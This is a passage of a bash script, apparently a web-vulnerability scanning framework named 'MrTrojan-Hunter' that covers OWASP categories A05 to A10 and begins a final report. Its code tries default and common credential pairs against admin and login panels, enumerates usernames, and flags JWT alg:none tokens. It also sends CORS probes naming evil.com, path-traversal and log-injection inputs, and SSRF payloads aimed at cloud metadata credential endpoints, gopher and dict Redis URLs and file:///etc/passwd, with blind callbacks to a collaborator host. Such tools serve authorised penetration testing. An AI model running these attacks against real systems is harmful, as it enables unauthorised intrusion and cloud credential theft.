  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"
  [[ ! -s "$ALIVE" ]] && { log_warn "No alive URLs — skipping A05"; return 0; }

  # ── HTTP Security Headers ─────────────────────────────────────────────────
  log_module "HTTP security header audit (full)"
  while IFS= read -r url; do
    local headers; headers=$(curl -sk -I "$url" 2>/dev/null || true)
    local missing=""
    local present=""
    echo "$headers" | grep -qi "Strict-Transport-Security"    && present+=" HSTS"     || missing+=" HSTS"
    echo "$headers" | grep -qi "X-Frame-Options"              && present+=" XFO"      || missing+=" X-Frame-Options"
    echo "$headers" | grep -qi "X-Content-Type-Options"       && present+=" XCTO"     || missing+=" X-Content-Type-Options"
    echo "$headers" | grep -qi "Content-Security-Policy"      && present+=" CSP"      || missing+=" CSP"
    echo "$headers" | grep -qi "Referrer-Policy"              && present+=" RP"       || missing+=" Referrer-Policy"
    echo "$headers" | grep -qi "Permissions-Policy"           && present+=" PP"       || missing+=" Permissions-Policy"
    echo "$headers" | grep -qi "X-XSS-Protection"             && present+=" XXSS"     || true
    echo "$headers" | grep -qi "Expect-CT"                    && present+=" Expect-CT"|| true
    [[ -n "$missing" ]] && \
      echo "$url | MISSING:$missing | PRESENT:$present" >> "$OUT/security_headers.txt"
    # Dangerous headers leaking info
    echo "$headers" | grep -iE "^Server:|^X-Powered-By:|^X-AspNet-Version:|^X-Generator:" \
      | while IFS= read -r h; do
          echo "$url | INFO-LEAK: $h" >> "$OUT/info_leak_headers.txt"
        done || true
  done < "$ALIVE" || true
  [[ -s "$OUT/security_headers.txt" ]] && \
    log_warn "Missing security headers found → $OUT/security_headers.txt"

  # ── Default credentials on common services ────────────────────────────────
  log_module "Default credential check (common admin panels)"
  local DEFAULT_CREDS=(
    "admin:admin" "admin:password" "admin:123456" "admin:admin123"
    "root:root" "root:toor" "root:password"
    "administrator:administrator" "test:test" "guest:guest"
  )
  local ADMIN_PATHS=("/admin" "/login" "/wp-login.php" "/administrator"
    "/phpmyadmin" "/pma" "/manager/html" "/console" "/admin/login")
  while IFS= read -r url; do
    for path in "${ADMIN_PATHS[@]}"; do
      local form_code; form_code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
      [[ "$form_code" == "200" ]] || continue
      for cred in "${DEFAULT_CREDS[@]}"; do
        local u="${cred%%:*}"; local p="${cred##*:}"
        local code; code=$(curl -sk -o /dev/null -w "%{http_code}" \
          -X POST "${url}${path}" \
          -d "username=${u}&password=${p}&user=${u}&pass=${p}" \
          2>/dev/null || true)
        [[ "$code" =~ ^(200|302)$ ]] && \
          echo "[DEFAULT-CRED ${code}] ${url}${path} | ${cred}" >> "$OUT/default_creds.txt"
      done
    done
  done < <(head -10 "$ALIVE") || true
  [[ -s "$OUT/default_creds.txt" ]] && log_vuln "Default credentials → $OUT/default_creds.txt"

  # ── CORS wildcard ──────────────────────────────────────────────────────────
  log_module "CORS wildcard detection"
  while IFS= read -r url; do
    local resp; resp=$(curl -sk -H "Origin: https://evil.com" -I "$url" 2>/dev/null \
      | grep -i "access-control-allow-origin" || true)
    echo "$resp" | grep -qE '\*|evil\.com' && \
      echo "$url => $resp" >> "$OUT/cors_wildcard.txt"
  done < "$ALIVE" || true

  # ── Stack trace / error page leakage ─────────────────────────────────────
  log_module "Error page / stack trace leakage"
  local ERROR_PROBES=("'\";<script>" "../../../../etc/passwd" "%00" "null" "undefined")
  while IFS= read -r url; do
    for probe in "${ERROR_PROBES[@]}"; do
      local resp; resp=$(curl -sk "${url}?id=${probe}" 2>/dev/null | head -30 || true)
      echo "$resp" | grep -iqE "stack trace|exception|sql syntax|at .*\.java|traceback|django|laravel|rails|symfony|struts" && {
        log_warn "Stack trace leak: $url?id=${probe}"
        echo "$url?id=${probe}" >> "$OUT/stack_trace_leak.txt"
      }
    done
  done < <(head -15 "$ALIVE") || true

  # ── nuclei misconfiguration templates ─────────────────────────────────────
  if tool_ok nuclei; then
    run_cmd "nuclei misconfiguration + default-login templates" \
      bash -c "nuclei -l '$ALIVE' \
        -t '${NUCLEI_TEMPLATES}/http/misconfiguration/' \
        -t '${NUCLEI_TEMPLATES}/http/default-logins/' \
        -c 30 -silent \
        -o '$OUT/nuclei_misconfig.txt' 2>/dev/null"
  fi

  log_ok "A05 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A06 — VULNERABLE & OUTDATED COMPONENTS
# ─────────────────────────────────────────────
owasp_a06_components() {
  log_phase "MrTrojan-Hunter | OWASP A06 — Vulnerable & Outdated Components"
  local OUT="$OUTPUT_DIR/owasp_a06_components"
  mkdir -p "$OUT"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"
  [[ ! -s "$ALIVE" ]] && { log_warn "No alive URLs — skipping A06"; return 0; }

  # ── Fingerprint via headers & responses ───────────────────────────────────
  log_module "Component version fingerprinting"
  while IFS= read -r url; do
    local headers; headers=$(curl -sk -I "$url" 2>/dev/null || true)
    local body; body=$(curl -sk "$url" 2>/dev/null | head -50 || true)
    # Server / framework versions
    echo "$headers" | grep -iE "Server:|X-Powered-By:|X-Generator:|X-AspNet|X-Runtime|X-Version" \
      >> "$OUT/version_headers.txt" || true
    # Meta generator tags
    echo "$body" | grep -iE '<meta[^>]+generator[^>]+>' \
      >> "$OUT/meta_generator.txt" || true
    # JS library versions from script src
    echo "$body" | grep -iE 'src="[^"]+\.(jquery|bootstrap|angular|react|vue|lodash|moment)[^"]*' \
      | grep -oE '(jquery|bootstrap|angular|react|vue|lodash|moment)[^"]*' \
      >> "$OUT/js_libraries.txt" || true
  done < "$ALIVE" || true

  # ── CVE scan via nuclei (main A06 weapon) ─────────────────────────────────
  if tool_ok nuclei; then
    run_cmd "nuclei CVE templates (all severities)" \
      bash -c "nuclei -l '$ALIVE' \
        -t '${NUCLEI_TEMPLATES}/http/cves/' \
        -severity low,medium,high,critical -c 50 -silent \
        -o '$OUT/nuclei_cves.txt' 2>/dev/null"

    run_cmd "nuclei technology-specific exploits" \
      bash -c "nuclei -l '$ALIVE' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/' \
        -tags apache,nginx,iis,php,wordpress,drupal,joomla,jenkins,jira,confluence,tomcat,struts,spring,laravel,rails -c 30 -silent \
        -o '$OUT/nuclei_tech_vulns.txt' 2>/dev/null"
  fi

  # ── Known-path vuln checks for popular frameworks ─────────────────────────
  log_module "Framework-specific vulnerability paths"
  local FRAMEWORK_PATHS=(
    "/struts/webconsole.html"      # Struts
    "/webdav/"                     # WebDAV
    "/.svn/entries"                # SVN
    "/.git/config"                 # Git
    "/WEB-INF/web.xml"             # Java
    "/META-INF/"                   # Java
    "/jmx-console/"                # JBoss
    "/admin-console/"              # JBoss
    "/management"                  # Spring Boot
    "/actuator/heapdump"           # Spring Boot heapdump (RCE-adjacent)
    "/actuator/env"                # Spring Boot env
    "/solr/admin/"                 # Solr
    "/axis2/axis2-admin/"          # Axis2
    "/phpmyadmin/"                 # PHPMyAdmin
    "/adminer.php"                 # Adminer
    "/phpinfo.php"                 # PHP info
    "/info.php"
    "/test.php"
    "/server-status"               # Apache
    "/server-info"
    "/nginx_status"                # Nginx
    "/ws_ftp.ini"                  # FTP config
    "/.DS_Store"                   # macOS artefact
    "/Thumbs.db"
  )
  while IFS= read -r url; do
    for path in "${FRAMEWORK_PATHS[@]}"; do
      local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
      [[ "$code" =~ ^(200|301|302)$ ]] && {
        log_warn "Framework path found [${code}]: ${url}${path}"
        echo "[${code}] ${url}${path}" >> "$OUT/framework_paths.txt"
      }
    done
  done < <(head -15 "$ALIVE") || true

  # ── npm / pip package audits if package files exposed ─────────────────────
  log_module "Exposed package manifests (package.json, requirements.txt)"
  while IFS= read -r url; do
    for pkg_file in "/package.json" "/requirements.txt" "/composer.json" "/Gemfile" "/go.mod"; do
      local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${pkg_file}" 2>/dev/null || true)
      [[ "$code" == "200" ]] && {
        log_vuln "Package manifest exposed: ${url}${pkg_file}"
        curl -sk "${url}${pkg_file}" 2>/dev/null \
          | head -50 >> "$OUT/exposed_manifests.txt" || true
        echo "=== ${url}${pkg_file} ===" >> "$OUT/exposed_manifests.txt"
      }
    done
  done < <(head -10 "$ALIVE") || true

  log_ok "A06 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A07 — IDENTIFICATION & AUTH FAILURES
# ─────────────────────────────────────────────
owasp_a07_auth() {
  log_phase "MrTrojan-Hunter | OWASP A07 — Identification & Authentication Failures"
  local OUT="$OUTPUT_DIR/owasp_a07_auth"
  mkdir -p "$OUT"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"
  local PARAM_URLS="$OUTPUT_DIR/06_params/param_urls.txt"
  [[ ! -s "$ALIVE" ]] && { log_warn "No alive URLs — skipping A07"; return 0; }

  # ── Weak / default session tokens ─────────────────────────────────────────
  log_module "Session token analysis (entropy, predictability)"
  while IFS= read -r url; do
    local cookies; cookies=$(curl -sk -c - "$url" 2>/dev/null | grep -v "^#" | awk '{print $NF}' || true)
    for tok in $cookies; do
      local len=${#tok}
      [[ $len -lt 16 ]] && {
        log_warn "Short session token ($len chars) at $url: $tok"
        echo "$url | SHORT_TOKEN($len): $tok" >> "$OUT/weak_tokens.txt"
      }
      # check if numeric-only (predictable)
      [[ "$tok" =~ ^[0-9]+$ ]] && {
        log_warn "Numeric-only session token at $url: $tok"
        echo "$url | NUMERIC_TOKEN: $tok" >> "$OUT/weak_tokens.txt"
      }
    done || true
  done < <(head -10 "$ALIVE") || true

  # ── JWT analysis ───────────────────────────────────────────────────────────
  log_module "JWT token discovery and weakness check"
  if [[ -s "$PARAM_URLS" ]]; then
    grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' \
      "$PARAM_URLS" 2>/dev/null | sort -u > "$OUT/jwt_tokens.txt" || true
  fi
  # Also scan crawled URLs for JWTs
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"
  [[ -s "$URLS" ]] && grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' \
    "$URLS" 2>/dev/null | sort -u >> "$OUT/jwt_tokens.txt" || true
  sort -u "$OUT/jwt_tokens.txt" -o "$OUT/jwt_tokens.txt" 2>/dev/null || true

  if [[ -s "$OUT/jwt_tokens.txt" ]]; then
    log_info "JWT tokens found: $(wc -l < "$OUT/jwt_tokens.txt")"
    while IFS= read -r jwt; do
      # Decode header (base64)
      local header; header=$(echo "$jwt" | cut -d. -f1 \
        | awk '{n=length($0)%4; for(i=0;i<n;i++) printf "="; print $0}' \
        | base64 -d 2>/dev/null || true)
      # Check for alg:none
      echo "$header" | grep -qi '"alg":"none"' && {
        log_vuln "JWT alg:none vulnerability: $jwt"
        echo "[JWT-ALG-NONE] $jwt" >> "$OUT/jwt_vulns.txt"
      }
      # Check for weak alg HS256 (may be crackable)
      echo "$header" | grep -qi '"alg":"HS256"' && \
        echo "[JWT-HS256] $jwt" >> "$OUT/jwt_hs256.txt"
    done < "$OUT/jwt_tokens.txt" || true
  fi

  # ── Login brute-force wordlist (small, non-aggressive) ────────────────────
  log_module "Common credential pairs on login endpoints"
  local LOGIN_PATHS=("/login" "/wp-login.php" "/admin/login" "/api/login"
    "/auth/login" "/user/login" "/signin" "/api/auth")
  local CRED_PAIRS=("admin:admin" "admin:password" "admin:123456"
    "test:test" "admin:admin@123" "root:root")
  while IFS= read -r url; do
    for path in "${LOGIN_PATHS[@]}"; do
      local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
      [[ "$code" != "200" && "$code" != "405" ]] && continue
      for cred in "${CRED_PAIRS[@]}"; do
        local u="${cred%%:*}"; local p="${cred##*:}"
        local resp_code; resp_code=$(curl -sk -o /dev/null -w "%{http_code}" \
          -X POST "${url}${path}" \
          -d "username=${u}&password=${p}" \
          -H "Content-Type: application/x-www-form-urlencoded" \
          2>/dev/null || true)
        [[ "$resp_code" =~ ^(200|302)$ ]] && \
          echo "[AUTH-HIT ${resp_code}] ${url}${path} | ${cred}" >> "$OUT/auth_hits.txt"
      done
    done
  done < <(head -5 "$ALIVE") || true
  [[ -s "$OUT/auth_hits.txt" ]] && log_vuln "Auth hits → $OUT/auth_hits.txt"

  # ── Username enumeration ───────────────────────────────────────────────────
  log_module "Username enumeration (response timing/size)"
  local TEST_USERS=("admin" "administrator" "root" "test" "user" "info" "support")
  while IFS= read -r url; do
    for usr in "${TEST_USERS[@]}"; do
      local size_valid; size_valid=$(curl -sk -o /dev/null -w "%{size_download}" \
        -X POST "${url}/login" \
        -d "username=${usr}&password=wrongpassword_xyz123" 2>/dev/null || true)
      local size_invalid; size_invalid=$(curl -sk -o /dev/null -w "%{size_download}" \
        -X POST "${url}/login" \
        -d "username=nonexistent_xyz999&password=wrongpassword_xyz123" 2>/dev/null || true)
      local diff=$(( size_valid - size_invalid ))
      [[ ${diff#-} -gt 50 ]] && {
        log_warn "Username enumeration (size diff ${diff}): $usr at ${url}/login"
        echo "[ENUM] ${url}/login | user=$usr | size_diff=$diff" >> "$OUT/user_enum.txt"
      }
    done
  done < <(head -5 "$ALIVE") || true

  # ── nuclei auth templates ──────────────────────────────────────────────────
  if tool_ok nuclei; then
    run_cmd "nuclei auth / default-login templates" \
      bash -c "nuclei -l '$ALIVE' \
        -tags auth,jwt,login,default-login -c 30 -silent \
        -o '$OUT/nuclei_auth.txt' 2>/dev/null"
  fi

  log_ok "A07 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A08 — SOFTWARE & DATA INTEGRITY FAILURES
# ─────────────────────────────────────────────
owasp_a08_integrity() {
  log_phase "MrTrojan-Hunter | OWASP A08 — Software & Data Integrity Failures"
  local OUT="$OUTPUT_DIR/owasp_a08_integrity"
  mkdir -p "$OUT"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  # ── CI/CD config exposure ──────────────────────────────────────────────────
  log_module "CI/CD & pipeline config exposure"
  local CICD_PATHS=(
    "/.github/workflows/deploy.yml" "/.gitlab-ci.yml" "/.travis.yml"
    "/Jenkinsfile" "/bitbucket-pipelines.yml" "/.circleci/config.yml"
    "/.drone.yml" "/azure-pipelines.yml" "/.github/workflows/main.yml"
    "/deploy.sh" "/build.sh" "/Makefile" "/docker-compose.yml"
    "/docker-compose.prod.yml" "/Dockerfile" "/.dockerignore"
    "/.ansible/" "/ansible.cfg"
  )
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      for path in "${CICD_PATHS[@]}"; do
        local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
        [[ "$code" == "200" ]] && {
          log_vuln "CI/CD config exposed: ${url}${path}"
          echo "[CI/CD ${code}] ${url}${path}" >> "$OUT/cicd_exposed.txt"
        }
      done
    done < <(head -10 "$ALIVE") || true
  fi

  # ── Subresource integrity check on CDN scripts ────────────────────────────
  log_module "Subresource Integrity (SRI) check on external scripts"
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      curl -sk "$url" 2>/dev/null \
        | grep -iE '<script[^>]+src="https?://' \
        | grep -iv "integrity=" \
        | head -10 >> "$OUT/missing_sri.txt" || true
    done < <(head -10 "$ALIVE") || true
    [[ -s "$OUT/missing_sri.txt" ]] && \
      log_warn "External scripts without SRI → $OUT/missing_sri.txt"
  fi

  # ── Deserialization checks ────────────────────────────────────────────────
  log_module "Insecure deserialization markers"
  local DESER_PATTERNS="rO0ABX|YToyOntz|ACED0005|O:[0-9]+:|a:[0-9]+:|readObject|ObjectInputStream|pickle|marshal|unserialize"
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"
  if [[ -s "$URLS" ]]; then
    grep -iE "$DESER_PATTERNS" "$URLS" 2>/dev/null \
      | sort -u > "$OUT/deser_markers.txt" || true
    [[ -s "$OUT/deser_markers.txt" ]] && \
      log_warn "Potential deserialization endpoints → $OUT/deser_markers.txt"
  fi

  # ── nuclei deserialization/supply-chain templates ─────────────────────────
  if tool_ok nuclei && [[ -s "$ALIVE" ]]; then
    run_cmd "nuclei deserialization / integrity templates" \
      bash -c "nuclei -l '$ALIVE' \
        -tags deserialization,java,rce -c 30 -silent \
        -o '$OUT/nuclei_integrity.txt' 2>/dev/null"
  fi

  log_ok "A08 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A09 — SECURITY LOGGING & MONITORING FAILURES
# ─────────────────────────────────────────────
owasp_a09_logging() {
  log_phase "MrTrojan-Hunter | OWASP A09 — Security Logging & Monitoring Failures"
  local OUT="$OUTPUT_DIR/owasp_a09_logging"
  mkdir -p "$OUT"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"
  [[ ! -s "$ALIVE" ]] && { log_warn "No alive URLs — skipping A09"; return 0; }

  # ── Exposed log files ─────────────────────────────────────────────────────
  log_module "Exposed log file discovery"
  local LOG_PATHS=("/logs/" "/log/" "/debug.log" "/error.log" "/access.log"
    "/app.log" "/application.log" "/system.log" "/server.log"
    "/var/log/" "/storage/logs/laravel.log" "/logs/production.log"
    "/logs/debug.log" "/.log" "/tmp/debug.log"
    "/api/logs" "/api/v1/logs" "/admin/logs")
  while IFS= read -r url; do
    for path in "${LOG_PATHS[@]}"; do
      local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
      [[ "$code" == "200" ]] && {
        log_vuln "Log file exposed: ${url}${path}"
        echo "[LOG ${code}] ${url}${path}" >> "$OUT/exposed_logs.txt"
      }
    done
  done < <(head -10 "$ALIVE") || true

  # ── Log injection probe ───────────────────────────────────────────────────
  log_module "Log injection probe"
  local LOG_INJECT_PAYLOAD="%0A[INJECTED_LOG_ENTRY]%0A"
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      local code; code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "User-Agent: ${LOG_INJECT_PAYLOAD}" \
        -H "X-Forwarded-For: ${LOG_INJECT_PAYLOAD}" \
        "$url" 2>/dev/null || true)
      [[ "$code" != "400" && "$code" != "000" ]] && \
        echo "[LOG-INJECT-ACCEPTED] $url" >> "$OUT/log_inject_accepted.txt"
    done < <(head -20 "$ALIVE") || true
  fi

  # ── Monitoring endpoint exposure ──────────────────────────────────────────
  log_module "Monitoring endpoint exposure (metrics, health, status)"
  local MON_PATHS=("/metrics" "/health" "/healthz" "/status" "/ping"
    "/actuator/metrics" "/actuator/logfile" "/actuator/trace"
    "/api/health" "/api/status" "/_health" "/_status"
    "/diagnostics" "/system/diagnostics" "/monitoring" "/newrelic")
  while IFS= read -r url; do
    for path in "${MON_PATHS[@]}"; do
      local resp; resp=$(curl -sk "${url}${path}" 2>/dev/null | head -5 || true)
      local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
      [[ "$code" == "200" ]] && [[ -n "$resp" ]] && {
        log_warn "Monitoring endpoint exposed [${code}]: ${url}${path}"
        echo "[MONITOR ${code}] ${url}${path}" >> "$OUT/monitoring_exposed.txt"
      }
    done
  done < <(head -10 "$ALIVE") || true

  log_ok "A09 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A10 — SSRF (extended deep scan)
#  (complements phase_ssrf — focus on cloud metadata & blind)
# ─────────────────────────────────────────────
owasp_a10_ssrf_extended() {
  log_phase "MrTrojan-Hunter | OWASP A10 — SSRF Extended (Cloud Metadata + Blind)"
  local OUT="$OUTPUT_DIR/owasp_a10_ssrf_ext"
  mkdir -p "$OUT"
  local PARAM_URLS="$OUTPUT_DIR/06_params/param_urls.txt"
  local GF_SSRF="$OUTPUT_DIR/06_params/gf_ssrf.txt"

  {
    [[ -s "$PARAM_URLS" ]] && cat "$PARAM_URLS"
    [[ -s "$GF_SSRF" ]]    && cat "$GF_SSRF"
  } | grep -iE 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|fetch=|load=|src=|source=|href=|endpoint=' \
    | sort -u > "$OUT/ssrf_targets.txt" || true

  [[ ! -s "$OUT/ssrf_targets.txt" ]] && { log_warn "No SSRF targets — skipping A10 extended"; return 0; }

  # ── Cloud metadata endpoints ───────────────────────────────────────────────
  log_module "SSRF → Cloud metadata endpoints"
  local CLOUD_META=(
    "http://169.254.169.254/latest/meta-data/"                  # AWS EC2
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"  # AWS creds
    "http://169.254.169.254/computeMetadata/v1/"                # GCP
    "http://169.254.169.254/metadata/v1/"                       # DigitalOcean
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure
    "http://100.100.100.200/latest/meta-data/"                  # Alibaba Cloud
    "http://192.168.0.1/"                                       # Internal router
    "http://10.0.0.1/"                                          # Internal network
    "http://localhost/"
    "http://127.0.0.1/"
    "http://0.0.0.0/"
    "http://[::1]/"
    "http://0177.0.0.1/"                                        # Octal bypass
    "http://2130706433/"                                        # Decimal bypass
    "http://0x7f000001/"                                        # Hex bypass
    "http://127.1/"                                             # Short IP bypass
    "http://127.0.1/"
    "dict://127.0.0.1:6379/"                                    # Redis
    "gopher://127.0.0.1:6379/_*1%0d%0a"                        # Gopher Redis
    "file:///etc/passwd"                                        # File read
  )

  if tool_ok qsreplace; then
    for payload in "${CLOUD_META[@]}"; do
      cat "$OUT/ssrf_targets.txt" | head -20 \
        | qsreplace "$payload" 2>/dev/null \
        | while IFS= read -r url; do
            local resp; resp=$(curl -sk "$url" 2>/dev/null | head -10 || true)
            # AWS metadata markers
            echo "$resp" | grep -qiE "ami-|instance-id|security-credentials|AccessKeyId|root:x" && {
              log_vuln "SSRF Cloud Metadata confirmed: $url [${payload}]"
              echo "[SSRF-CLOUD] $url | payload=$payload" >> "$OUT/ssrf_cloud_hits.txt"
              echo "$resp" >> "$OUT/ssrf_cloud_hits.txt"
            }
          done || true
    done
    [[ -s "$OUT/ssrf_cloud_hits.txt" ]] && log_vuln "Cloud metadata SSRF → $OUT/ssrf_cloud_hits.txt"
  fi

  # ── Blind SSRF via Burp Collaborator ──────────────────────────────────────
  if [[ -n "$BURP_COLLABORATOR" ]] && tool_ok qsreplace; then
    log_module "Blind SSRF → Burp Collaborator callbacks"
    for proto in "http" "https"; do
      cat "$OUT/ssrf_targets.txt" \
        | qsreplace "${proto}://${BURP_COLLABORATOR}/ssrf-$(date +%s)" 2>/dev/null \
        | xargs -I% -P 20 curl -sk '%' -o /dev/null 2>/dev/null || true
    done
    # Header-based blind SSRF
    while IFS= read -r url; do
      curl -sk "$url" \
        -H "X-Forwarded-For: http://${BURP_COLLABORATOR}/ssrf-hdr" \
        -H "Referer: http://${BURP_COLLABORATOR}/ssrf-referer" \
        -H "True-Client-IP: http://${BURP_COLLABORATOR}/ssrf-client-ip" \
        -o /dev/null 2>/dev/null || true
    done < <(head -30 "$OUT/ssrf_targets.txt") || true
    log_ok "Blind SSRF payloads sent → check $BURP_COLLABORATOR"
  fi

  # ── Protocol smuggling ─────────────────────────────────────────────────────
  log_module "SSRF protocol smuggling (dict, gopher, ftp, ldap)"
  local PROTO_PAYLOADS=(
    "dict://127.0.0.1:6379/info"
    "ftp://127.0.0.1:21/"
    "ldap://127.0.0.1:389/%0astats%0aquit"
    "sftp://127.0.0.1:22/"
    "tftp://127.0.0.1:69/TEST"
  )
  if tool_ok qsreplace; then
    for payload in "${PROTO_PAYLOADS[@]}"; do
      cat "$OUT/ssrf_targets.txt" | head -10 \
        | qsreplace "$payload" 2>/dev/null \
        | while IFS= read -r url; do
            local resp; resp=$(curl -sk "$url" 2>/dev/null | head -5 || true)
            [[ -n "$resp" ]] && \
              echo "[SSRF-PROTO] $url | $payload | response: $resp" >> "$OUT/ssrf_proto_hits.txt"
          done || true
    done
  fi

  log_ok "A10 complete → $OUT/"
}


# ─────────────────────────────────────────────
#  PHASE 21 — FINAL REPORT
# ─────────────────────────────────────────────
phase_report() {
  $RUN_REPORT || { log_info "Report skipped (--skip-report)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 21 — Final Report"
  local REPORT="$OUTPUT_DIR/99_report/report.md"
  local DATE; DATE=$(date '+%Y-%m-%d %H:%M:%S')

  {
    echo "# MrTrojan-Hunter Report"
    echo "**Target:** $DOMAIN"
    echo "**Framework:** MrTrojan-Hunter v1.0  |  **Date:** $DATE"
    echo "**Output:** $OUTPUT_DIR"
    echo ""
    echo "---"
    echo ""
    echo "## Summary"
    echo ""
    echo "| Phase | File | Count |"
    echo "|-------|------|-------|"
    
    local sub_count live_count url_count param_count js_count sens_count
    sub_count=$(wc -l < "$OUTPUT_DIR/01_subdomains/all_subdomains.txt" 2>/dev/null || echo 0)
    live_count=$(wc -l < "$OUTPUT_DIR/04_webprobe/alive_urls.txt" 2>/dev/null || echo 0)
    url_count=$(wc -l < "$OUTPUT_DIR/05_crawl/all_urls.txt" 2>/dev/null || echo 0)
    param_count=$(wc -l < "$OUTPUT_DIR/06_params/param_urls.txt" 2>/dev/null || echo 0)
    js_count=$(wc -l < "$OUTPUT_DIR/08_javascript/js_files.txt" 2>/dev/null || echo 0)
    sens_count=$(wc -l < "$OUTPUT_DIR/05_crawl/sensitive_files.txt" 2>/dev/null || echo 0)
    
    echo "| Subdomains     | 01_subdomains/all_subdomains.txt | $sub_count |"
    echo "| Live URLs      | 04_webprobe/alive_urls.txt       | $live_count |"
    echo "| All URLs       | 05_crawl/all_urls.txt            | $url_count |"
    echo "| Param URLs     | 06_params/param_urls.txt         | $param_count |"
    echo "| JS Files       | 08_javascript/js_files.txt       | $js_count |"
    echo "| Sensitive Files| 05_crawl/sensitive_files.txt     | $sens_count |"
    
    echo ""
    echo "---"
    echo ""
    echo "## Vulnerabilities Found"
    echo ""
    echo "### Critical / High"
  } > "$REPORT"

  local vuln_files=(
    # ── Core phases ────────────────────────────────────────
    "$OUTPUT_DIR/09_sqli/sqli_candidates.txt"
    "$OUTPUT_DIR/10_xss/dalfox_results.txt"
    "$OUTPUT_DIR/10_xss/kxss_output.txt"
    "$OUTPUT_DIR/11_lfi/lfi_etc_passwd.txt"
    "$OUTPUT_DIR/12_ssrf/ssrf_local_probe.txt"
    "$OUTPUT_DIR/13_redirect/redirect_hits.txt"
    "$OUTPUT_DIR/14_cors/cors_vulnerable.txt"
    "$OUTPUT_DIR/15_takeover/subzy_results.txt"
    "$OUTPUT_DIR/16_nuclei/nuclei_cves.txt"
    "$OUTPUT_DIR/17_secrets/exposed_files.txt"
    "$OUTPUT_DIR/17_secrets/grep_secrets.txt"
    # ── OWASP A01 — Broken Access Control ─────────────────
    "$OUTPUT_DIR/owasp_a01_access_control/idor_hits.txt"
    "$OUTPUT_DIR/owasp_a01_access_control/403_bypass.txt"
    "$OUTPUT_DIR/owasp_a01_access_control/dir_traversal.txt"
    "$OUTPUT_DIR/owasp_a01_access_control/nuclei_access_control.txt"
    # ── OWASP A02 — Cryptographic Failures ────────────────
    "$OUTPUT_DIR/owasp_a02_crypto/weak_tls.txt"
    "$OUTPUT_DIR/owasp_a02_crypto/sensitive_params_in_url.txt"
    "$OUTPUT_DIR/owasp_a02_crypto/cookie_flags.txt"
    "$OUTPUT_DIR/owasp_a02_crypto/mixed_content.txt"
    # ── OWASP A03 — Injection ──────────────────────────────
    "$OUTPUT_DIR/owasp_a03_injection/cmdi_confirmed.txt"
    "$OUTPUT_DIR/owasp_a03_injection/ssti_confirmed.txt"
    "$OUTPUT_DIR/owasp_a03_injection/xxe_confirmed.txt"
    "$OUTPUT_DIR/owasp_a03_injection/ldap_injection.txt"
    "$OUTPUT_DIR/owasp_a03_injection/nosql_injection.txt"
    "$OUTPUT_DIR/owasp_a03_injection/nuclei_injection.txt"
    # ── OWASP A04 — Insecure Design ────────────────────────
    "$OUTPUT_DIR/owasp_a04_insecure_design/no_rate_limit.txt"
    "$OUTPUT_DIR/owasp_a04_insecure_design/logic_flaws.txt"
    "$OUTPUT_DIR/owasp_a04_insecure_design/debug_endpoints.txt"
    # ── OWASP A05 — Security Misconfiguration ─────────────
    "$OUTPUT_DIR/owasp_a05_misconfig/security_headers.txt"
    "$OUTPUT_DIR/owasp_a05_misconfig/default_creds.txt"
    "$OUTPUT_DIR/owasp_a05_misconfig/cors_wildcard.txt"
    "$OUTPUT_DIR/owasp_a05_misconfig/stack_trace_leak.txt"
    # ── OWASP A06 — Vulnerable Components ─────────────────
    "$OUTPUT_DIR/owasp_a06_components/nuclei_cves.txt"
    "$OUTPUT_DIR/owasp_a06_components/framework_paths.txt"
    "$OUTPUT_DIR/owasp_a06_components/exposed_manifests.txt"
    # ── OWASP A07 — Auth Failures ──────────────────────────
    "$OUTPUT_DIR/owasp_a07_auth/auth_hits.txt"
    "$OUTPUT_DIR/owasp_a07_auth/jwt_vulns.txt"
    "$OUTPUT_DIR/owasp_a07_auth/weak_tokens.txt"
    "$OUTPUT_DIR/owasp_a07_auth/user_enum.txt"
    # ── OWASP A08 — Integrity Failures ────────────────────
    "$OUTPUT_DIR/owasp_a08_integrity/cicd_exposed.txt"
    "$OUTPUT_DIR/owasp_a08_integrity/deser_markers.txt"
    "$OUTPUT_DIR/owasp_a08_integrity/missing_sri.txt"
    # ── OWASP A09 — Logging Failures ──────────────────────
    "$OUTPUT_DIR/owasp_a09_logging/exposed_logs.txt"
    "$OUTPUT_DIR/owasp_a09_logging/monitoring_exposed.txt"
    # ── OWASP A10 — SSRF Extended ──────────────────────────
    "$OUTPUT_DIR/owasp_a10_ssrf_ext/ssrf_cloud_hits.txt"
    "$OUTPUT_DIR/owasp_a10_ssrf_ext/ssrf_proto_hits.txt"
